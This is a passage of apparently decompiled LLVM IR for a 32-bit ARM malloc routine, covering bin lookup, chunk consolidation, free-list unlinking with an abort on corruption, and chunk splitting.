dec_label_pc_15fa4:                               ; preds = %dec_label_pc_15f84, %dec_label_pc_15f7c
  %tmp202 = icmp ugt i32 %v0_15f7c, 255
  br i1 %tmp202, label %dec_label_pc_15ff4, label %dec_label_pc_15fac

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15fa4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15fb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  %v3_15fb8 = udiv i32 %v0_15f7c, 8
  store i32 %v3_15fb8, i32* @r7, align 4
  %v4_15fbc = mul nuw i32 %v3_15fb8, 8
  %v5_15fbc = add i32 %v4_15fb4, %v4_15fbc
  store i32 %v5_15fbc, i32* %r3.global-to-local, align 4
  %v1_15fc0 = add i32 %v5_15fbc, 44
  store i32 %v1_15fc0, i32* %ip.global-to-local, align 4
  %v1_15fc4 = add i32 %v5_15fbc, 56
  %v2_15fc4 = inttoptr i32 %v1_15fc4 to i32*
  %v3_15fc4 = load i32, i32* %v2_15fc4, align 4
  store i32 %v3_15fc4, i32* %r0.global-to-local, align 4
  %v9_15fc8 = icmp eq i32 %v3_15fc4, %v1_15fc0
  br i1 %v9_15fc8, label %dec_label_pc_16154, label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fac
  %v2_15fd0 = add i32 %v3_15fc4, %v0_15f7c
  store i32 %v2_15fd0, i32* %r3.global-to-local, align 4
  %v1_15fd4 = add i32 %v2_15fd0, 4
  %v2_15fd4 = inttoptr i32 %v1_15fd4 to i32*
  %v3_15fd4 = load i32, i32* %v2_15fd4, align 4
  store i32 %v3_15fd4, i32* %r2.global-to-local, align 4
  %v1_15fd8 = add i32 %v3_15fc4, 12
  %v2_15fd8 = inttoptr i32 %v1_15fd8 to i32*
  %v3_15fd8 = load i32, i32* %v2_15fd8, align 4
  store i32 %v3_15fd8, i32* %r1.global-to-local, align 4
  %v1_15fdc = or i32 %v3_15fd4, 1
  store i32 %v1_15fdc, i32* %r2.global-to-local, align 4
  %v1_15fe0 = add i32 %v3_15fc4, 8
  store i32 %v1_15fe0, i32* %r4.global-to-local, align 4
  store i32 %v1_15fdc, i32* %v2_15fd4, align 4
  %v0_15fe8 = load i32, i32* %ip.global-to-local, align 4
  %v1_15fe8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15fe8 = add i32 %v1_15fe8, 8
  %v3_15fe8 = inttoptr i32 %v2_15fe8 to i32*
  store i32 %v0_15fe8, i32* %v3_15fe8, align 4
  %v0_15fec = load i32, i32* %r1.global-to-local, align 4
  %v1_15fec = load i32, i32* %ip.global-to-local, align 4
  %v2_15fec = add i32 %v1_15fec, 12
  %v3_15fec = inttoptr i32 %v2_15fec to i32*
  store i32 %v0_15fec, i32* %v3_15fec, align 4
  br label %dec_label_pc_167a4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fa4
  store i32 %v0_15f7c, i32* %r0.global-to-local, align 4
  %v1_15ff8 = call i32 @__malloc_largebin_index(i32 %v0_15f7c)
  store i32 %v1_15ff8, i32* %r0.global-to-local, align 4
  %v0_15ffc = load i32, i32* @r4, align 4
  %v1_15ffc = and i32 %v0_15ffc, 2
  %v2_15ffc = icmp eq i32 %v1_15ffc, 0
  store i32 %v1_15ff8, i32* @r7, align 4
  br i1 %v2_15ffc, label %dec_label_pc_16154, label %dec_label_pc_16008

dec_label_pc_16008:                               ; preds = %dec_label_pc_15ff4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_16010 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16010, i32* @r0, align 4
  %v0_16014 = call i32 @__malloc_consolidate()
  store i32 %v0_16014, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_1601c:                               ; preds = %dec_label_pc_16168
  %v1_1601c = add i32 %v3_16168, 4
  %v2_1601c = inttoptr i32 %v1_1601c to i32*
  %v3_1601c = load i32, i32* %v2_1601c, align 4
  store i32 %v3_1601c, i32* %r3.global-to-local, align 4
  %v0_16020 = load i32, i32* @sl, align 4
  %v1_16024 = and i32 %v3_1601c, -4
  store i32 %v1_16024, i32* %r4.global-to-local, align 4
  %v1_16028 = add i32 %v3_16168, 12
  %v2_16028 = inttoptr i32 %v1_16028 to i32*
  %v3_16028 = load i32, i32* %v2_16028, align 4
  store i32 %v3_16028, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_16020, 255
  br i1 %tmp203, label %dec_label_pc_16084, label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_1601c
  %v9_16030 = icmp eq i32 %v3_16028, %v0_16088
  br i1 %v9_16030, label %dec_label_pc_16038, label %dec_label_pc_16084

dec_label_pc_16038:                               ; preds = %dec_label_pc_16030
  %v0_16038 = load i32, i32* @sb, align 4
  %v1_16038 = add i32 %v0_16038, 48
  %v2_16038 = inttoptr i32 %v1_16038 to i32*
  %v3_16038 = load i32, i32* %v2_16038, align 4
  store i32 %v3_16038, i32* %r3.global-to-local, align 4
  %v9_1603c = icmp eq i32 %v3_16168, %v3_16038
  br i1 %v9_1603c, label %dec_label_pc_16044, label %dec_label_pc_16084

dec_label_pc_16044:                               ; preds = %dec_label_pc_16038
  %v1_16044 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_16024, %v1_16044
  br i1 %tmp204, label %dec_label_pc_1604c, label %dec_label_pc_16084

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16044
  %v2_1604c = sub i32 %v1_16024, %v0_16020
  store i32 %v2_1604c, i32* %r2.global-to-local, align 4
  %v2_16050 = add i32 %v0_16020, %v3_16168
  store i32 %v2_16050, i32* %r3.global-to-local, align 4
  %v1_16054 = or i32 %v0_16020, 1
  store i32 %v1_16054, i32* %r0.global-to-local, align 4
  %v1_16058 = or i32 %v2_1604c, 1
  store i32 %v1_16058, i32* %r1.global-to-local, align 4
  %v1_1605c = add i32 %v3_16168, 8
  store i32 %v1_1605c, i32* %r4.global-to-local, align 4
  %v2_16060 = add i32 %v0_16088, 8
  %v3_16060 = inttoptr i32 %v2_16060 to i32*
  store i32 %v2_16050, i32* %v3_16060, align 4
  %v0_16064 = load i32, i32* %r3.global-to-local, align 4
  %v1_16064 = load i32, i32* %ip.global-to-local, align 4
  %v2_16064 = add i32 %v1_16064, 12
  %v3_16064 = inttoptr i32 %v2_16064 to i32*
  store i32 %v0_16064, i32* %v3_16064, align 4
  %v0_16068 = load i32, i32* %r0.global-to-local, align 4
  %v1_16068 = load i32, i32* @r6, align 4
  %v2_16068 = add i32 %v1_16068, 4
  %v3_16068 = inttoptr i32 %v2_16068 to i32*
  store i32 %v0_16068, i32* %v3_16068, align 4
  %v0_1606c = load i32, i32* %r3.global-to-local, align 4
  %v1_1606c = load i32, i32* @sb, align 4
  %v2_1606c = add i32 %v1_1606c, 48
  %v3_1606c = inttoptr i32 %v2_1606c to i32*
  store i32 %v0_1606c, i32* %v3_1606c, align 4
  %v0_16070 = load i32, i32* %r2.global-to-local, align 4
  %v1_16070 = load i32, i32* %r3.global-to-local, align 4
  %v3_16070 = add i32 %v1_16070, %v0_16070
  %v4_16070 = inttoptr i32 %v3_16070 to i32*
  store i32 %v0_16070, i32* %v4_16070, align 4
  %v0_16074 = load i32, i32* %r1.global-to-local, align 4
  %v1_16074 = load i32, i32* %r3.global-to-local, align 4
  %v2_16074 = add i32 %v1_16074, 4
  %v3_16074 = inttoptr i32 %v2_16074 to i32*
  store i32 %v0_16074, i32* %v3_16074, align 4
  %v0_16078 = load i32, i32* %ip.global-to-local, align 4
  %v1_16078 = load i32, i32* %r3.global-to-local, align 4
  %v2_16078 = add i32 %v1_16078, 12
  %v3_16078 = inttoptr i32 %v2_16078 to i32*
  store i32 %v0_16078, i32* %v3_16078, align 4
  %v0_1607c = load i32, i32* %ip.global-to-local, align 4
  %v1_1607c = load i32, i32* %r3.global-to-local, align 4
  %v2_1607c = add i32 %v1_1607c, 8
  %v3_1607c = inttoptr i32 %v2_1607c to i32*
  store i32 %v0_1607c, i32* %v3_1607c, align 4
  br label %dec_label_pc_167a4

dec_label_pc_16084:                               ; preds = %dec_label_pc_16044, %dec_label_pc_16038, %dec_label_pc_16030, %dec_label_pc_1601c
  %v9_16084 = icmp eq i32 %v1_16024, %v0_16020
  %v2_16088 = add i32 %v3_16028, 8
  %v3_16088 = inttoptr i32 %v2_16088 to i32*
  store i32 %v0_16088, i32* %v3_16088, align 4
  %v0_1608c = load i32, i32* %ip.global-to-local, align 4
  %v1_1608c = load i32, i32* %r5.global-to-local, align 4
  %v2_1608c = add i32 %v1_1608c, 12
  %v3_1608c = inttoptr i32 %v2_1608c to i32*
  store i32 %v0_1608c, i32* %v3_1608c, align 4
  br i1 %v9_16084, label %dec_label_pc_161e4.loopexit, label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16084
  %v0_160a0 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_160a0, 255
  br i1 %tmp205, label %dec_label_pc_160c4, label %dec_label_pc_160a8

dec_label_pc_160a8:                               ; preds = %dec_label_pc_160a0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v1_160ac = load i32, i32* %r8.global-to-local, align 4
  %v2_160ac = add i32 %v1_160ac, ptrtoint (i32* @global_var_2a010.835 to i32)
  %v3_160ac = inttoptr i32 %v2_160ac to i32*
  %v4_160ac = load i32, i32* %v3_160ac, align 4
  %v3_160b0 = udiv i32 %v0_160a0, 8
  store i32 %v3_160b0, i32* %r0.global-to-local, align 4
  %v4_160b4 = mul nuw i32 %v3_160b0, 8
  %v5_160b4 = add i32 %v4_160ac, %v4_160b4
  store i32 %v5_160b4, i32* %r3.global-to-local, align 4
  %v1_160b8 = add i32 %v5_160b4, 44
  store i32 %v1_160b8, i32* %ip.global-to-local, align 4
  %v1_160bc = add i32 %v5_160b4, 52
  %v2_160bc = inttoptr i32 %v1_160bc to i32*
  %v3_160bc = load i32, i32* %v2_160bc, align 4
  store i32 %v3_160bc, i32* @lr, align 4
  br label %dec_label_pc_1611c

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160a0
  store i32 %v0_160a0, i32* %r0.global-to-local, align 4
  %v1_160c8 = call i32 @__malloc_largebin_index(i32 %v0_160a0)
  store i32 %v1_160c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  %v1_160d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_160d0 = add i32 %v1_160d0, ptrtoint (i32* @global_var_2a010.835 to i32)
  %v3_160d0 = inttoptr i32 %v2_160d0 to i32*
  %v4_160d0 = load i32, i32* %v3_160d0, align 4
  %v4_160d4 = mul i32 %v1_160c8, 8
  %v5_160d4 = add i32 %v4_160d0, %v4_160d4
  store i32 %v5_160d4, i32* %r3.global-to-local, align 4
  %v1_160d8 = add i32 %v5_160d4, 44
  store i32 %v1_160d8, i32* %ip.global-to-local, align 4
  %v1_160dc = add i32 %v5_160d4, 52
  %v2_160dc = inttoptr i32 %v1_160dc to i32*
  %v3_160dc = load i32, i32* %v2_160dc, align 4
  store i32 %v3_160dc, i32* @lr, align 4
  %v9_160e0 = icmp eq i32 %v3_160dc, %v1_160d8
  br i1 %v9_160e0, label %dec_label_pc_1611c, label %dec_label_pc_160e8

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160c4
  %v1_160e8 = add i32 %v5_160d4, 56
  %v2_160e8 = inttoptr i32 %v1_160e8 to i32*
  %v3_160e8 = load i32, i32* %v2_160e8, align 4
  store i32 %v3_160e8, i32* %r1.global-to-local, align 4
  %v1_160ec = add i32 %v3_160e8, 4
  %v2_160ec = inttoptr i32 %v1_160ec to i32*
  %v3_160ec = load i32, i32* %v2_160ec, align 4
  store i32 %v3_160ec, i32* %r3.global-to-local, align 4
  %v0_160f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_160f0 = icmp ult i32 %v0_160f0, %v3_160ec
  br i1 %v3_160f0, label %.thread, label %dec_label_pc_1610c.preheader

.thread:                                          ; preds = %dec_label_pc_160e8
  store i32 %v1_160d8, i32* @lr, align 4
  store i32 %v3_160e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1611c

dec_label_pc_1610c.preheader:                     ; preds = %dec_label_pc_160e8
  %v2_160f8 = or i32 %v0_160f0, 1
  store i32 %v2_160f8, i32* %r2.global-to-local, align 4
  %v1_1610c179 = add i32 %v3_160dc, 4
  %v2_1610c180 = inttoptr i32 %v1_1610c179 to i32*
  %v3_1610c181 = load i32, i32* %v2_1610c180, align 4
  store i32 %v3_1610c181, i32* %r3.global-to-local, align 4
  %v3_16110183 = icmp ult i32 %v2_160f8, %v3_1610c181
  br i1 %v3_16110183, label %dec_label_pc_16108, label %dec_label_pc_16118

dec_label_pc_16108:                               ; preds = %dec_label_pc_1610c.preheader, %dec_label_pc_16108
  %v0_16118184 = phi i32 [ %v3_16108, %dec_label_pc_16108 ], [ %v3_160dc, %dec_label_pc_1610c.preheader ]
  %v1_16108 = add i32 %v0_16118184, 8
  %v2_16108 = inttoptr i32 %v1_16108 to i32*
  %v3_16108 = load i32, i32* %v2_16108, align 4
  store i32 %v3_16108, i32* @lr, align 4
  %v1_1610c = add i32 %v3_16108, 4
  %v2_1610c = inttoptr i32 %v1_1610c to i32*
  %v3_1610c = load i32, i32* %v2_1610c, align 4
  store i32 %v3_1610c, i32* %r3.global-to-local, align 4
  %v3_16110 = icmp ult i32 %v2_160f8, %v3_1610c
  br i1 %v3_16110, label %dec_label_pc_16108, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %dec_label_pc_16108, %dec_label_pc_1610c.preheader
  %v0_16118.lcssa = phi i32 [ %v3_160dc, %dec_label_pc_1610c.preheader ], [ %v3_16108, %dec_label_pc_16108 ]
  %v1_16118 = add i32 %v0_16118.lcssa, 12
  %v2_16118 = inttoptr i32 %v1_16118 to i32*
  %v3_16118 = load i32, i32* %v2_16118, align 4
  store i32 %v3_16118, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1611c

dec_label_pc_1611c:                               ; preds = %.thread, %dec_label_pc_160c4, %dec_label_pc_160a8, %dec_label_pc_16118
  %v0_1613c = phi i32 [ %v1_160d8, %dec_label_pc_160c4 ], [ %v1_160b8, %dec_label_pc_160a8 ], [ %v3_16118, %dec_label_pc_16118 ], [ %v3_160e8, %.thread ]
  %v0_16130 = phi i32 [ %v1_160c8, %dec_label_pc_160c4 ], [ %v3_160b0, %dec_label_pc_160a8 ], [ %v1_160c8, %dec_label_pc_16118 ], [ %v1_160c8, %.thread ]
  %v1_16120 = phi i32 [ %v1_160d0, %dec_label_pc_160c4 ], [ %v1_160ac, %dec_label_pc_160a8 ], [ %v1_160d0, %dec_label_pc_16118 ], [ %v1_160d0, %.thread ]
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v2_16120 = add i32 %v1_16120, ptrtoint (i32* @global_var_2a010.835 to i32)
  %v3_16120 = inttoptr i32 %v2_16120 to i32*
  %v4_16120 = load i32, i32* %v3_16120, align 4
  %v3_16124 = sdiv i32 %v0_16130, 32
  store i32 %v3_16124, i32* %r3.global-to-local, align 4
  %v4_16128 = mul nsw i32 %v3_16124, 4
  %v5_16128 = add i32 %v4_16120, %v4_16128
  store i32 %v5_16128, i32* %r1.global-to-local, align 4
  %v1_1612c = add i32 %v5_16128, 820
  %v2_1612c = inttoptr i32 %v1_1612c to i32*
  %v3_1612c = load i32, i32* %v2_1612c, align 4
  %v1_16130 = urem i32 %v0_16130, 32
  store i32 %v1_16130, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_16138 = shl i32 1, %v1_16130
  %v8_16138 = or i32 %v3_1612c, %v7_16138
  store i32 %v8_16138, i32* %r3.global-to-local, align 4
  %v1_1613c = load i32, i32* @r6, align 4
  %v2_1613c = add i32 %v1_1613c, 12
  %v3_1613c = inttoptr i32 %v2_1613c to i32*
  store i32 %v0_1613c, i32* %v3_1613c, align 4
  %v0_16140 = load i32, i32* @lr, align 4
  %v1_16140 = load i32, i32* @r6, align 4
  %v2_16140 = add i32 %v1_16140, 8
  %v3_16140 = inttoptr i32 %v2_16140 to i32*
  store i32 %v0_16140, i32* %v3_16140, align 4
  %v0_16144 = load i32, i32* %r3.global-to-local, align 4
  %v1_16144 = load i32, i32* %r1.global-to-local, align 4
  %v2_16144 = add i32 %v1_16144, 820
  %v3_16144 = inttoptr i32 %v2_16144 to i32*
  store i32 %v0_16144, i32* %v3_16144, align 4
  %v0_16148 = load i32, i32* @r6, align 4
  %v1_16148 = load i32, i32* @lr, align 4
  %v2_16148 = add i32 %v1_16148, 12
  %v3_16148 = inttoptr i32 %v2_16148 to i32*
  store i32 %v0_16148, i32* %v3_16148, align 4
  %v0_1614c = load i32, i32* @r6, align 4
  %v1_1614c = load i32, i32* %ip.global-to-local, align 4
  %v2_1614c = add i32 %v1_1614c, 8
  %v3_1614c = inttoptr i32 %v2_1614c to i32*
  store i32 %v0_1614c, i32* %v3_1614c, align 4
  %v0_16168.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16168

dec_label_pc_16154:                               ; preds = %dec_label_pc_15ff4, %dec_label_pc_15fac, %dec_label_pc_16008
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_1615c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_1615c, i32* @sb, align 4
  %v0_16160 = load i32, i32* @sl, align 4
  %v1_16160 = add i32 %v0_16160, 16
  store i32 %v1_16160, i32* @fp, align 4
  %v1_16164 = add i32 %v4_1615c, 52
  store i32 %v1_16164, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16168

dec_label_pc_16168:                               ; preds = %dec_label_pc_1611c, %dec_label_pc_16154
  %v0_16088 = phi i32 [ %v0_16168.pre, %dec_label_pc_1611c ], [ %v1_16164, %dec_label_pc_16154 ]
  %v1_16168 = add i32 %v0_16088, 12
  %v2_16168 = inttoptr i32 %v1_16168 to i32*
  %v3_16168 = load i32, i32* %v2_16168, align 4
  store i32 %v3_16168, i32* @r6, align 4
  %v9_1616c = icmp eq i32 %v3_16168, %v0_16088
  br i1 %v9_1616c, label %dec_label_pc_16174, label %dec_label_pc_1601c

dec_label_pc_16174:                               ; preds = %dec_label_pc_16168
  %v0_16174 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_16174, 256
  %v0_1622c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_16174.dec_label_pc_1622c_crit_edge, label %dec_label_pc_1617c

dec_label_pc_16174.dec_label_pc_1622c_crit_edge:  ; preds = %dec_label_pc_16174
  %.pre200 = mul i32 %v0_1622c.pre, 8
  br label %dec_label_pc_1622c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16174
  %v4_1617c = mul i32 %v0_1622c.pre, 8
  %v5_1617c = add i32 %v4_1617c, %v0_16088
  store i32 %v5_1617c, i32* %r3.global-to-local, align 4
  %v1_16180 = add i32 %v5_1617c, -8
  store i32 %v1_16180, i32* %r1.global-to-local, align 4
  %v1_16184 = add i32 %v5_1617c, 4
  %v2_16184 = inttoptr i32 %v1_16184 to i32*
  %storemerge.pre = load i32, i32* %v2_16184, align 4
  br label %dec_label_pc_16224

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16224
  %v1_1618c = add i32 %v1_161b4, 4
  %v2_1618c = inttoptr i32 %v1_1618c to i32*
  %v3_1618c = load i32, i32* %v2_1618c, align 4
  store i32 %v3_1618c, i32* %r3.global-to-local, align 4
  %v1_16190 = and i32 %v3_1618c, -4
  store i32 %v1_16190, i32* %r2.global-to-local, align 4
  %v3_16194 = icmp ult i32 %v1_16190, %v0_16174
  %v1_16198 = add i32 %v1_161b4, 12
  %v2_16198 = inttoptr i32 %v1_16198 to i32*
  %v3_16198 = load i32, i32* %v2_16198, align 4
  store i32 %v3_16198, i32* %r0.global-to-local, align 4
  br i1 %v3_16194, label %dec_label_pc_16224, label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %dec_label_pc_1618c
  %v1_161a0 = add i32 %v1_161b4, 8
  %v2_161a0 = inttoptr i32 %v1_161a0 to i32*
  %v3_161a0 = load i32, i32* %v2_161a0, align 4
  store i32 %v3_161a0, i32* %r1.global-to-local, align 4
  %v1_161a4 = add i32 %v3_161a0, 12
  %v2_161a4 = inttoptr i32 %v1_161a4 to i32*
  %v3_161a4 = load i32, i32* %v2_161a4, align 4
  store i32 %v3_161a4, i32* %r3.global-to-local, align 4
  %v9_161a8 = icmp eq i32 %v3_161a4, %v1_161b4
  br i1 %v9_161a8, label %dec_label_pc_161b0, label %dec_label_pc_161bc

dec_label_pc_161b0:                               ; preds = %dec_label_pc_161a0
  %v1_161b0 = add i32 %v3_16198, 8
  %v2_161b0 = inttoptr i32 %v1_161b0 to i32*
  %v3_161b0 = load i32, i32* %v2_161b0, align 4
  store i32 %v3_161b0, i32* %r3.global-to-local, align 4
  %v9_161b4 = icmp eq i32 %v3_161b0, %v1_161b4
  br i1 %v9_161b4, label %dec_label_pc_161c0, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161b0
  %v0_161bc = call i32 @abort()
  store i32 %v0_161bc, i32* %r0.global-to-local, align 4
  %v0_161c0.pre = load i32, i32* @sl, align 4
  %v1_161c0.pre = load i32, i32* @r2, align 4
  %v0_161c8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_161c0

dec_label_pc_161c0:                               ; preds = %dec_label_pc_161b0, %dec_label_pc_161bc
  %v1_161c8 = phi i32 [ %v3_16198, %dec_label_pc_161b0 ], [ %v0_161bc, %dec_label_pc_161bc ]
  %v0_161c8 = phi i32 [ %v3_161a0, %dec_label_pc_161b0 ], [ %v0_161c8.pre, %dec_label_pc_161bc ]
  %v1_161c0 = phi i32 [ %v1_16190, %dec_label_pc_161b0 ], [ %v1_161c0.pre, %dec_label_pc_161bc ]
  %v0_161c0 = phi i32 [ %v0_16174, %dec_label_pc_161b0 ], [ %v0_161c0.pre, %dec_label_pc_161bc ]
  %v2_161c0 = sub i32 %v1_161c0, %v0_161c0
  store i32 %v2_161c0, i32* %lr.global-to-local, align 4
  %v2_161c8 = add i32 %v1_161c8, 8
  %v3_161c8 = inttoptr i32 %v2_161c8 to i32*
  store i32 %v0_161c8, i32* %v3_161c8, align 4
  %v0_161cc = load i32, i32* %r0.global-to-local, align 4
  %v1_161cc = load i32, i32* %r1.global-to-local, align 4
  %v2_161cc = add i32 %v1_161cc, 12
  %v3_161cc = inttoptr i32 %v2_161cc to i32*
  store i32 %v0_161cc, i32* %v3_161cc, align 4
  %v0_161d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_161d0 = add i32 %v0_161d0, 8
  store i32 %v1_161d0, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_161c0, 15
  br i1 %tmp207, label %dec_label_pc_161f0, label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161c0
  %v1_161d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_161d8 = add i32 %v1_161d8, %v0_161d0
  store i32 %v2_161d8, i32* %r2.global-to-local, align 4
  %v1_161dc = add i32 %v2_161d8, 4
  %v2_161dc = inttoptr i32 %v1_161dc to i32*
  %v3_161dc = load i32, i32* %v2_161dc, align 4
  store i32 %v3_161dc, i32* %r3.global-to-local, align 4
  store i32 %v1_161d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161e4.loopexit:                      ; preds = %dec_label_pc_16084
  %v1_16090 = load i32, i32* @r6, align 4
  %v2_16090 = load i32, i32* @sl, align 4
  %v3_16090 = add i32 %v2_16090, %v1_16090
  store i32 %v3_16090, i32* %r2.global-to-local, align 4
  %v2_16094 = add i32 %v3_16090, 4
  %v3_16094 = inttoptr i32 %v2_16094 to i32*
  %v4_16094 = load i32, i32* %v3_16094, align 4
  store i32 %v4_16094, i32* %r3.global-to-local, align 4
  %v2_16098 = add i32 %v1_16090, 8
  store i32 %v2_16098, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161e4:                               ; preds = %.dec_label_pc_161e4_crit_edge, %dec_label_pc_161e4.loopexit, %dec_label_pc_161d8
  %v1_161e8 = phi i32 [ %v4_1630c, %.dec_label_pc_161e4_crit_edge ], [ %v3_16090, %dec_label_pc_161e4.loopexit ], [ %v2_161d8, %dec_label_pc_161d8 ]
  %v0_161e4 = phi i32 [ %v7_1630c, %.dec_label_pc_161e4_crit_edge ], [ %v4_16094, %dec_label_pc_161e4.loopexit ], [ %v3_161dc, %dec_label_pc_161d8 ]
  %v1_161e4 = or i32 %v0_161e4, 1
  store i32 %v1_161e4, i32* %r3.global-to-local, align 4
  %v2_161e8 = add i32 %v1_161e8, 4
  %v3_161e8 = inttoptr i32 %v2_161e8 to i32*
  store i32 %v1_161e4, i32* %v3_161e8, align 4
  br label %dec_label_pc_167a4

dec_label_pc_161f0:                               ; preds = %dec_label_pc_161c0
  %v1_161f0 = load i32, i32* @sl, align 4
  %v2_161f0 = add i32 %v1_161f0, %v0_161d0
  store i32 %v2_161f0, i32* %r2.global-to-local, align 4
  %v1_161f4 = or i32 %v1_161f0, 1
  store i32 %v1_161f4, i32* %r3.global-to-local, align 4
  %v0_161f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_161f8 = or i32 %v0_161f8, 1
  store i32 %v1_161f8, i32* %r1.global-to-local, align 4
  store i32 %v1_161d0, i32* %r4.global-to-local, align 4
  %v2_16200 = add i32 %v0_161d0, 4
  %v3_16200 = inttoptr i32 %v2_16200 to i32*
  store i32 %v1_161f4, i32* %v3_16200, align 4
  %v0_16204 = load i32, i32* %r2.global-to-local, align 4
  %v1_16204 = load i32, i32* @r6, align 4
  %v2_16204 = add i32 %v1_16204, 8
  %v3_16204 = inttoptr i32 %v2_16204 to i32*
  store i32 %v0_16204, i32* %v3_16204, align 4
  %v0_16208 = load i32, i32* %r2.global-to-local, align 4
  %v1_16208 = load i32, i32* @r6, align 4
  %v2_16208 = add i32 %v1_16208, 12
  %v3_16208 = inttoptr i32 %v2_16208 to i32*
  store i32 %v0_16208, i32* %v3_16208, align 4
  %v0_1620c = load i32, i32* %lr.global-to-local, align 4
  %v1_1620c = load i32, i32* %r2.global-to-local, align 4
  %v3_1620c = add i32 %v1_1620c, %v0_1620c
  %v4_1620c = inttoptr i32 %v3_1620c to i32*
  store i32 %v0_1620c, i32* %v4_1620c, align 4
  %v0_16210 = load i32, i32* %r1.global-to-local, align 4
  %v1_16210 = load i32, i32* %r2.global-to-local, align 4
  %v2_16210 = add i32 %v1_16210, 4
  %v3_16210 = inttoptr i32 %v2_16210 to i32*
  store i32 %v0_16210, i32* %v3_16210, align 4
  %v0_16214 = load i32, i32* @r6, align 4
  %v1_16214 = load i32, i32* %r2.global-to-local, align 4
  %v2_16214 = add i32 %v1_16214, 12
  %v3_16214 = inttoptr i32 %v2_16214 to i32*
  store i32 %v0_16214, i32* %v3_16214, align 4
  %v0_16218 = load i32, i32* @r6, align 4
  %v1_16218 = load i32, i32* %r2.global-to-local, align 4
  %v2_16218 = add i32 %v1_16218, 8
  %v3_16218 = inttoptr i32 %v2_16218 to i32*
  store i32 %v0_16218, i32* %v3_16218, align 4
  br label %dec_label_pc_167a4

dec_label_pc_16224:                               ; preds = %dec_label_pc_1618c, %dec_label_pc_1617c
  %v1_161b4 = phi i32 [ %storemerge.pre, %dec_label_pc_1617c ], [ %v3_16198, %dec_label_pc_1618c ]
  store i32 %v1_161b4, i32* %ip.global-to-local, align 4
  %v9_16224 = icmp eq i32 %v1_161b4, %v1_16180
  br i1 %v9_16224, label %dec_label_pc_1622c.loopexit, label %dec_label_pc_1618c

dec_label_pc_1622c.loopexit:                      ; preds = %dec_label_pc_16224
  br label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16174.dec_label_pc_1622c_crit_edge, %dec_label_pc_1622c.loopexit
  %v4_1625c.pre-phi = phi i32 [ %.pre200, %dec_label_pc_16174.dec_label_pc_1622c_crit_edge ], [ %v4_1617c, %dec_label_pc_1622c.loopexit ]
  %v1_1622c = add i32 %v0_1622c.pre, 1
  store i32 %v1_1622c, i32* %r2.global-to-local, align 4
  %v1_16230 = urem i32 %v1_1622c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r0.global-to-local, align 4
  %v6_1623c = shl i32 1, %v1_16230
  store i32 %v6_1623c, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_16244 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16244, i32* %r3.global-to-local, align 4
  %v3_16248 = udiv i32 %v1_1622c, 32
  store i32 %v3_16248, i32* @r5, align 4
  %v4_1624c = mul nuw nsw i32 %v3_16248, 4
  %v5_1624c = add i32 %v4_16244, %v4_1624c
